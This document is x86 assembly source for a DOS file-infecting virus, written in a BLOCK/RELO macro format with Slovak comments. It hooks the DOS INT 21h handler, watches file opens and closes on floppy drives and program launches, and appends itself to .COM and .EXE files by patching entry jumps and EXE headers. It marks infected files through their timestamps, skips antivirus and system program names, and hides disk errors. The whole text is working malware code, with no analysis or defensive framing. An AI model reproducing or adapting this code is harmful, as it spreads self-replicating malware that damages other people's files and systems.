;INFECT_ONLY_CMM_EXX = 1

BLOCK   int21
I<      cld                                                             >
        CALLL   push_all
I<      cmp     ah, 3ch                                                 >
        _JZ     infect_floppy
I<      cmp     ah, 3dh                                                 >
        _JZ     infect_floppy
I<      cmp     ah, 3eh                                                 >
        _JZ     infect_close
I<      cmp     ah, 4bh                                                 >
        _JNZ    call_int21
        JUMP    infect_and_call_int21

BLOCK   infect_and_call_int21
        CALLL   infect
        JUMP    call_int21

BLOCK   call_int21
        CALLL   pop_all
I<      jmp     dword ptr cs:[1234h]                                    >
RELO    old21

BLOCK   infect_floppy
I<      mov     si, dx                                                  >
I<      lodsb                                                           >
I<      cmp     byte ptr ds:[si], ':'                                   >
        _JNZ    no_drive_pressed
I<      or      al, 20h                                                 >
I<      cmp     al, 'b'                                                 >
        _JA     call_int21
        JUMP    infect_in_close

BLOCK   no_drive_pressed
I<      push    ax                                                      >
I<      mov     ah, 19h                                                 >
I<      int     21h                                                     >
I<      cmp     al, 1                                                   >
I<      pop     ax                                                      >
        _JA     call_int21
        JUMP    infect_in_close

BLOCK   infect_in_close
I<      cmp     ah, 3ch                                                 >
        _JNZ    infect_and_call_int21
I<      xor     bx, bx                                                  >
        CALLL   check4handle
        _JNZ    call_int21
        CALLL   init_int24
I<      mov     ah, 60h                                                 >
I<      dec     si                                                      >
I<      push    cs                                                      >
I<      pop     es                                                      >
I<      mov     di, 1234h                                               >
RELO    path
I<      int     21h                                                     >
;        _JC     no_inf_int24
        CALLL   pop_all
I<      pushf                                                           >
I<      call    dword ptr cs:[1234h]                                    >
RELO    old21
        CALLL   push_all
I<      pushf                                                           >
I<      mov     bx, 0FFFFh                                              >
I<      adc     bx, 0                                                   >
I<      and     ax, bx                                                  >
I<      mov     cs:[1234h], ax                                          >
RELO    handle
        CALLL   deinit_int24
I<      popf                                                            >
        CALLL   pop_all
I<      sti                                                             >
I<      retf    2                                                       >

BLOCK   infect_close
        CALLL   check4handle
        _JC     call_int21
I<      xor     ax, ax                                                  >
I<      mov     cs:[1234h], ax                                          >
RELO    handle
        CALLL   pop_all
I<      pushf                                                           >
I<      call    dword ptr cs:[1234h]                                    >
RELO    old21
        CALLL   push_all
I<      pushf                                                           >
I<      push    cs                                                      >
I<      pop     ds                                                      >
I<      mov     dx, 1234h                                               >
RELO    path
        CALLL   infect
I<      popf                                                            >
        CALLL   pop_all
I<      sti                                                             >
I<      retf    2                                                       >

; BX - handle
; if CF=1 iny handle alebo ine PSP
; if ZF=1 ine PSP alebo BX=HANDLE
BLOCK   check4handle
I<      push    bx                                                      >
I<      mov     ah, 62h                                                 >
I<      int     21h                                                     >
I<      mov     di, 1234h                                               >
RELO    psp
I<      cmp     cs:[di], bx                                             >
I<      mov     cs:[di], bx                                             >
I<      mov     di, 1234h                                               >
RELO    handle
        _JNZ    new_psp
I<      pop     bx                                                      >
I<      mov     ax, bx                                                  >
I<      sub     ax, word ptr cs:[di]                                    >
I<      add     ax, 0FFFFh                                              >
I<      inc     ax                                                      >
I<      ret                                                             >

BLOCK   new_psp
I<      mov     word ptr cs:[di], 0                                     >
I<      xor     ax, ax                                                  >
I<      pop     bx                                                      >
I<      stc                                                             >
I<      ret                                                             >

BLOCK   infect
I<      push    ds                                                      >
I<      pop     es                                                      >
I<      mov     di, dx                                                  >
I<      mov     cx, 67d                                                 >
I<      xor     al, al                                                  >
I<      repne   scasb                                                   >
        _JNZ    no_inf
I<      lea     si, [di - 5]                                            >
I<      lodsw                                                           >
I<      or      ax, 2020h                                               >
I<      mov     bx, 'mo'                                                >
ifdef   INFECT_ONLY_CMM_EXX
I<      mov     bx, 'mm'                                                >
endif
I<      cmp     ax, 'c.'                                                >
        _JZ     file_ok
I<      mov     bx, 'ex'                                                >
ifdef   INFECT_ONLY_CMM_EXX
I<      mov     bx, 'xx'                                                >
endif
I<      cmp     ax, 'e.'                                                >
        _JZ     file_ok
        JUMP    no_inf

BLOCK   file_ok
I<      lodsw                                                           >
I<      or      ax, 2020h                                               >
I<      cmp     ax, bx                                                  >
        _JNZ    no_inf
I<      sub     si, 4                                                   >
        JUMP    prepare_str

BLOCK   prepare_str
I<      dec     si                                                      >
I<      mov     al, [si]                                                >
I<      cmp     al, '/'                                                 >
        _JZ     str_start
I<      cmp     al, '\'                                                 >
        _JZ     str_start
I<      cmp     al, ':'                                                 >
        _JZ     str_start
I<      cmp     si, dx                                                  >
        _JA     prepare_str
I<      dec     si                                                      >
        JUMP    str_start

BLOCK   str_start
I<      inc     si                                                      >
I<      lodsw                                                           >
I<      or      ax, 2020h                                               >
I<      xor     ax, 0AA55h

I<      cmp     ax, ('ci' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('on' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('ew' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('bt' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('va' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('-f' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('cs' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('lc' xor 0AA55h)                                   >
        _JZ     no_inf

I<      cmp     ax, ('oc' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('iw' xor 0AA55h)                                   >
        _JZ     no_inf
I<      cmp     ax, ('rk' xor 0AA55h)                                   >
        _JZ     no_inf

        CALLL   init_int24

I<      mov     ax, 3d02h                                               >
I<      pushf                                                           >
I<      call    dword ptr cs:[1234h]                                    >
RELO    old21
        _JC     no_inf_int24

I<      mov     bx, ax                                                  >

I<      xor     ax, ax                                                  >
I<      mov     ds, ax                                                  >
I<      mov     si, ds:[46Dh]                                           >

I<      push    cs                                                      >
I<      push    cs                                                      >
I<      pop     ds                                                      >
I<      pop     es                                                      >

I<      mov     ax, 05700h                                              >
I<      int     21h                                                     >
        _JC     close

I<      mov     ds:[1234h], dx                                          >
RELO    date
I<      mov     al, cl                                                  >
I<      and     al, 00011111b                                           >
I<      cmp     al, 4                                                   >
        _JZ     close

I<      and     cl, 11100000b                                           >
I<      or      cl, 4                                                   >
I<      mov     ds:[1234h], cx                                          >
RELO    time

I<      and     si, 0FFF0h                                              >
I<      cmp     ds:[1234h], si                                          >
RELO    ticks
        _JZ     close
I<      mov     ds:[1234h], si                                          >
RELO    ticks

I<      mov     ah, 3fh                                                 >
I<      mov     cx, 18h                                                 >
I<      mov     dx, 1234h                                               >
RELO    exe_header
I<      mov     si, dx                                                  >
I<      int     21h                                                     >
        _JC     close

I<      mov     ax, 4202h                                               >
I<      cwd                                                             >
I<      xor     cx, cx                                                  >
I<      int     21h                                                     >

I<      mov     word ptr ds:[0], 02e8dh                                 >

I<      cmp     word ptr ds:[si], 'ZM'                                  >
        _JZ     exe_infect
I<      cmp     word ptr ds:[si], 'MZ'                                  >
        _JZ     exe_infect

I<      mov     byte ptr ds:[1234h], cl                                 >
RELO    filetype
                                        ; min 3kb   COM file
I<      cmp     ax, 3000d                                               >
        _JB     close
                                        ; max 57kb  COM file
I<      cmp     ax, 57000d                                              >
        _JA     close

I<      push    si                                                      >
I<      mov     di, 1234h                                               >
RELO    exe_header
I<      mov     cl, ds:[di]                                             >
I<      mov     byte ptr ds:[di], 0E9h                                  >
I<      inc     di                                                      >
I<      mov     ds:[1234h], cl                                          >
RELO    old_inst
I<      mov     ds:[1234h], cl                                          >
RELO    _old_inst
I<      mov     cx, ds:[di]                                             >
I<      mov     si, 1234h                                               >
RELO    old_inst
I<      mov     ds:[si + 1], cx                                         >
I<      sub     ax, 3                                                   >
I<      stosw                                                           >

I<      mov     ax, BAD_CLEAN                                           >
I<      cmp     word ptr ds:[1234h], ax                                 >
RELO    @JMPS
        _JA     no_com_ojeb
I<      mov     bp, 16                                                  >
        CALLL   @rnd_max
I<      sub     ax, 8                                                   >
I<      add     cx, ax                                                  >
        JUMP    no_com_ojeb

BLOCK   no_com_ojeb
I<      mov     si, 1234h                                               >
RELO    _old_inst
I<      mov     ds:[si + 1], cx                                         >
I<      pop     si                                                      >
I<      mov     ax, -10h                                                >
I<      mov     ds:[1234h], ax                                          >
RELO    old_cs
I<      mov     ds:[1234h], ax                                          >
RELO    old_ss
I<      mov     ax, 100h                                                >
I<      mov     ds:[1234h], ax                                          >
RELO    old_ip
I<      mov     ds:[1234h], ax                                          >
RELO    _old_ip
I<      mov     ax, 0FFFEh                                              >
I<      mov     ds:[1234h], ax                                          >
RELO    old_sp
I<      inc     ax                                                      >
I<      mov     ds:[1234h], ax                                          >
RELO    old_max_mem
I<      mov     ax, 1000h                                               >
I<      mov     ds:[1234h], ax                                          >
RELO    min_mem

I<      mov     ax, 4202h                                               >
I<      cwd                                                             >
I<      xor     cx, cx                                                  >
I<      int     21h                                                     >

I<      add     ax, 100h                                                >
        JUMP    set_marker

BLOCK   set_marker
I<      mov     ds:[2], ax                                              >
I<      mov     ah, 40h                                                 >
I<      cwd                                                             >
I<      mov     cx, 1234h                                               >
RELO    in_mem
I<      int     21h                                                     >
        _JC     close

I<      mov     ax, 4200h                                               >
I<      cwd                                                             >
I<      xor     cx, cx                                                  >
I<      int     21h                                                     >

I<      mov     ah, 40h                                                 >
I<      mov     dx, si                                                  >
I<      mov     cx, 18h                                                 >
I<      int     21h                                                     >
        _JC     close

I<      mov     ax, 5701h                                               >
I<      mov     cx, ds:[1234h]                                          >
RELO    time
I<      mov     dx, ds:[1234h]                                          >
RELO    date
I<      int     21h                                                     >
        JUMP    close

BLOCK   close
I<      mov     ah, 3eh                                                 >
I<      int     21h                                                     >
        JUMP    no_inf_int24

BLOCK   no_inf_int24
        CALLL   deinit_int24
        JUMP    no_inf

BLOCK   no_inf
I<      ret                                                             >

BLOCK   exe_infect
I<      inc     cx                                                      >
I<      mov     byte ptr ds:[1234h], cl                                 >
RELO    filetype

                                        ; min 10kb  EXE file
I<      or      dx, dx                                                  >
        _JNZ    no_short_exe
I<      cmp     ax, 10000d                                              >
        _JB     close
        JUMP    no_short_exe
                                        ; max 400kb EXE file
BLOCK   no_short_exe
I<      cmp     dx, 400 / 66                                            >
        _JA     close

I<      push    ax                                                      >
I<      push    dx                                                      >
I<      mov     cx, 200h                                                >
I<      div     cx                                                      >
I<      inc     ax                                                      >
I<      cmp     [si + 04h], ax                                          >
I<      pop     dx                                                      >
I<      pop     ax                                                      >
        _JNZ    close

I<      push    ax                                                      >
I<      push    dx                                                      >
I<      xor     ax, ax                                                  >
I<      cmp     word ptr ds:[si + 0ch], 0FFFFh                          >
        _JZ     max_mem_FFFF

I<      mov     ax, [si + 4]                                            >
I<      inc     ax                                                      >
I<      mov     cl, 5                                                   >
I<      shl     ax, cl                                                  >
I<      sub     ax, [si + 8]                                            >
        JUMP    max_mem_FFFF

BLOCK   max_mem_FFFF
I<      add     ax, [si + 0ch]                                          >
I<      mov     ds:[1234h], ax                                          >
RELO    old_max_mem
I<      mov     ax, [si + 0eh]                                          >
I<      mov     ds:[1234h], ax                                          >
RELO    old_ss
I<      mov     ax, [si + 10h]                                          >
I<      mov     ds:[1234h], ax                                          >
RELO    old_sp
I<      mov     ax, [si + 14h]                                          >
I<      mov     ds:[1234h], ax                                          >
RELO    old_ip
I<      mov     ds:[1234h], ax                                          >
RELO    _old_ip
I<      mov     ax, [si + 16h]                                          >
I<      mov     ds:[1234h], ax                                          >
RELO    old_cs

I<      pop     dx                                                      >
I<      pop     ax                                                      >
I<      push    ax                                                      >
I<      push    dx                                                      >

I<      mov     word ptr [si + 0ch], 0FFFFh                             >
I<      mov     word ptr [si + 10h], 07ffeh                             >
I<      mov     word ptr [si + 14h], 0                                  >
I<      mov     cx, 10h                                                 >
I<      div     cx                                                      >
I<      sub     ax, [si + 8]                                            >
I<      inc     ax                                                      >
I<      mov     [si + 0eh], ax                                          >
I<      mov     [si + 16h], ax                                          >

I<      mov     ax, [si + 04h]                                          >
I<      inc     ax                                                      >
I<      mov     cl, 5                                                   >
I<      shl     ax, cl                                                  >
I<      sub     ax, [si + 8]                                            >
I<      add     ax, [si + 0ah]                                          >
I<      mov     di, ax                                                  >

I<      pop     cx                                                      >
I<      pop     dx                                                      >
I<      and     dx, not 0fh                                             >
I<      add     dx, 10h                                                 >
I<      adc     cx, 0                                                   >
I<      mov     ax, 4200h                                               >
I<      int     21h                                                     >
I<      add     ax, 1234h                                               >
RELO    in_mem
I<      adc     dx, 0                                                   >

I<      mov     cx, 200h                                                >
I<      div     cx                                                      >
I<      mov     [si + 02h], dx                                          >
I<      add     dx, 0FFFFh                                              >
I<      adc     ax, 0                                                   >
I<      mov     [si + 04h], ax                                          >
I<      mov     [si + 0ah], 800h                                        >

I<      inc     ax                                                      >
I<      mov     cl, 5                                                   >
I<      shl     ax, cl                                                  >
I<      sub     ax, [si + 8]                                            >
I<      add     ax, [si + 0ah]                                          >
I<      mov     word ptr ds:[1234h], ax                                 >
RELO    min_mem

I<      sub     di, ax                                                  >
        _JBE    write_exeh
I<      add     [si + 0ah], di                                          >
        JUMP    write_exeh

BLOCK   write_exeh
I<      mov     ax, BAD_CLEAN                                           >
I<      cmp     word ptr ds:[1234h], ax                                 >
RELO    @JMPS
I<      mov     ax, 0                                                   >
        _JA     set_marker
I<      mov     bp, 16                                                  >
        CALLL   @rnd_max
I<      sub     al, 8                                                   >
I<      mov     di, 1234h                                               >
RELO    _old_ip
I<      add     ds:[di + 1], al                                         >
I<      mov     word ptr ds:[0], 0ed33h                                 >
I<      mov     ax, 09090h                                              >
        JUMP    set_marker

BLOCK   int24
I<      mov     al, 3                                                   >
I<      iret                                                            >

BLOCK   init_int24
I<      push    dx                                                      >
I<      push    ds                                                      >
I<      push    es                                                      >
I<      push    cs                                                      >
I<      pop     ds                                                      >
I<      mov     ax, 3524h                                               >
I<      int     21h                                                     >
I<      mov     ds:[1234h], es                                          >
RELO    int24_seg
I<      mov     ds:[1234h], bx                                          >
RELO    int24_ofs
I<      mov     dx, 1234h                                               >
RELO    int24
I<      mov     ax, 2524h                                               >
I<      int     21h                                                     >
I<      pop     es                                                      >
I<      pop     ds                                                      >
I<      pop     dx                                                      >
I<      ret                                                             >

BLOCK   deinit_int24
I<      push    ds                                                      >
I<      mov     dx, cs:[1234h]                                          >
RELO    int24_ofs
I<      mov     ds, cs:[1234h]                                          >
RELO    int24_seg
I<      mov     ax, 2524h                                               >
I<      int     21h                                                     >
I<      pop     ds                                                      >
I<      ret                                                             >

BLOCK   push_all
I<      pop     word ptr cs:[1234h]                                     >
RELO    exit_adr
I<      push    ax                                                      >
I<      push    bx                                                      >
I<      push    cx                                                      >
I<      push    dx                                                      >
I<      push    si                                                      >
I<      push    di                                                      >
I<      push    bp                                                      >
I<      push    ds                                                      >
I<      push    es                                                      >
I<      jmp     word ptr cs:[1234h]
RELO    exit_adr

BLOCK   pop_all
I<      pop     word ptr cs:[1234h]                                     >
RELO    exit_adr
I<      pop     es                                                      >
I<      pop     ds                                                      >
I<      pop     bp                                                      >
I<      pop     di                                                      >
I<      pop     si                                                      >
I<      pop     dx                                                      >
I<      pop     cx                                                      >
I<      pop     bx                                                      >
I<      pop     ax                                                      >
I<      jmp     word ptr cs:[1234h]
RELO    exit_adr

BLOCK   old21
D<      dd      0                                                       >
BLOCK   int24_seg
D<      dw      0                                                       >
BLOCK   int24_ofs
D<      dw      0                                                       >
BLOCK   exit_adr
D<      dw      0                                                       >
BLOCK   exe_header
D<      db      18h dup(0)                                              >
BLOCK   ticks
D<      dw      0                                                       >
BLOCK   time
D<      dw      0                                                       >
BLOCK   date
D<      dw      0                                                       >
BLOCK   psp
D<      dw      0                                                       >
BLOCK   handle
D<      dw      0                                                       >
BLOCK   path
D<      db      7 dup(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0ah)                >
